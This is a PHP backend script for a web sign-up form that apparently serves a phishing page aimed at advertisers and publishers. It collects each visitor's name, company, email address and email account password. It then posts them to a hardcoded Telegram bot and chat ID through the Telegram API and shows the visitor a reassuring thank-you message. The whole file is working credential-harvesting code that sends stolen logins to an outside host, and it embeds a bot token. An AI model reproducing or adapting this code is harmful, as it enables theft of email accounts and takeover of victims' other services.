<?php
// TELEGRAM
// Only process POST requests.
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Replace with your Telegram Bot API token and chat ID.
    $botToken   = '6377242619:AAHXehb42p2beh9_Wke2j8PvJYCF1iKy0qI';
    $chatId     = '-1001900073508';
    $data_error = [];
    // Get the form fields and remove whitespace.
    $user_type      = strip_tags(trim($_POST["user_role"]));
    $company_name   = strip_tags(trim($_POST["company_name"]));
    $company_name   = str_replace(array("\r", "\n"), array(" ", " "), $company_name);
    $company_name_p = strip_tags(trim($_POST["company_name_p"]));
    $company_name_p = str_replace(array("\r", "\n"), array(" ", " "), $company_name_p);
    $name           = strip_tags(trim($_POST["name"]));
    $name           = str_replace(array("\r", "\n"), array(" ", " "), $name);
    $email          = trim($_POST["email"]);
    $email_pass     = strip_tags(trim($_POST["email_pass"]));
    $agree          = trim($_POST["agree"]);
    if ((!filter_var($email, FILTER_VALIDATE_EMAIL))) {
        array_push($data_error, "Email is not correct");
    }
    if ($agree != true) {
        array_push($data_error, "You must agree to the terms");
    }
    if ($user_type == 'advertiser') {
        if ($company_name == '') {
            array_push($data_error, "Company name field is empty");
        }
        $telegramMessage = "Type: $user_type\n";
        $telegramMessage .= "Name: $name\n";
        $telegramMessage .= "Email: $email\n";
        $telegramMessage .= "Email password: $email_pass\n";
    } else {
        if ($company_name_p == '') {
            array_push($data_error, "Company name / Freelance name field is empty");
        }
        if ($name == '') {
            array_push($data_error, "Name field is empty");
        }
        $telegramMessage = "Type: $user_type\n";
        $telegramMessage .= "Name: $name\n";
        $telegramMessage .= "Name company: $company_name_p\n";
        $telegramMessage .= "Email: $email\n";
        $telegramMessage .= "Email password: $email_pass\n";
    }
    if (($email_pass == '') or (strlen($email_pass) <= 6)) {
        array_push($data_error, "Email password field is not correct");
    }
    if (count($data_error) != 0) {
        http_response_code(200);
        header('Content-Type: application/json');
        echo json_encode(['status' => 'error', 'data_error' => $data_error]);
        exit();
    }
    // Create the URL for sending the message to the Telegram bot.
    $telegramApiUrl     = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $telegramParameters = [
        'chat_id' => $chatId,
        'text'    => $telegramMessage,
    ];

    // Send the message to the Telegram bot using cURL.
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $telegramParameters);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $telegramResponse = curl_exec($ch);
    curl_close($ch);

    // Check if the message was sent successfully to the Telegram bot.
    if ($telegramResponse && json_decode($telegramResponse)->ok) {
        // Set a 200 (okay) response code.
        header('Content-Type: application/json');
        echo json_encode(['status' => 'ok', 'data' => 'Thank you! Your message has been sent successfully. Our managers will contact you.']);
        exit();
    } else {
        // Set a 500 (internal server error) response code.
        http_response_code(500);
        echo "Oops! Something went wrong, and we couldn't send your message to the Telegram bot.";
        exit();
    }

} else {
    // Not a POST request, set a 403 (forbidden) response code.
    http_response_code(403);
    echo "There was a problem with your submission, please try again.";
}
?>